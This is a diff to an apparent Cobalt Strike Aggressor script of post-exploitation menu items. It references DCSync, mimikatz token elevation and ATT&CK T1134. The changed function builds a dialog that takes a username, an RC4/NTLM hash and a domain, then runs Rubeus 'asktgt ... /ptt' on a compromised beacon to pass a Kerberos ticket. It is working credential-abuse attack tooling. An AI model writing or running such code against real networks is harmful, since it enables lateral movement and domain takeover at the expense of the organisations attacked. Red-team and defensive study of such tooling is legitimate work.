@@ -189,7 +189,7 @@ item "Elevate to Specified Token  - T1134"{
 					passticket($bid);
 					}
 				}
-
+				
 #################################################
 
 #   Mass DCSync
@@ -444,50 +444,22 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 #################################################
 sub passticket{
- # beacon ID
     $bid = $1;
-    
- # command arugement variable  
-    $cmdargs = "";
-  
- # Pop Dialog Box and control flow
-    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
- 
- # manipulate the first argument depending on the executables command line switch statements
- # manipulate the second argument depending on the expected input format  
-        foreach $key => $value ($3){
-            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
-                $cmdargs .= ' /';
-                $cmdargs .= $key;
-                $cmdargs .= ':';
-                $cmdargs .= $value.' ';
-            }
- # manipulate the first argument depending on the executables command line switch statements            
-            else if ($value eq "true"){
-                $cmdargs .= ' /';
-                $cmdargs .= $key;
-            }
+    $dialog = dialog("Pass The Ticket", %(username => "", rc4 => "", fqdn => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "asktgt /rc4:$3['rc4'] /domain:$3['fqdn'] /user:$3['username'] /ptt";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Enumerating Remote Computer');
+            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), $cmdargs);
         }
- # btask just displays message in beacon window
- # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
-       if ($3["execmethod"] eq "Execute-Assembly"){
-            btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
-            bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), 'asktgt'.$cmdargs.''."/ptt");
-        }
-      
     }));
-    
- # Dialog box contents and text boxes mapped to command line argument keys   
-    dialog_description($dialog, "**Think with your Tickets, Jimmy!** Use the FQDN for the Domain input!");
-    drow_text($dialog, "user",  "User");
-    drow_text($dialog, "rc4",  "RC4/NTLM");
-    drow_text($dialog, "domain",  "FQ Domain Name");
-    dbutton_action($dialog, "Run");
-	dialog_show($dialog);
+    dialog_description($dialog, "Pass The Ticket w/Rubeus");
+    drow_text($dialog, "username",  "Please Enter the username:");
+    drow_text($dialog, "rc4",  "Please Enter the rc4 hash:");
+    drow_text($dialog, "fqdn",  "Please Enter the Fully Qualified Domain Name:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
 }
-
-
-
 
 #################################################
 
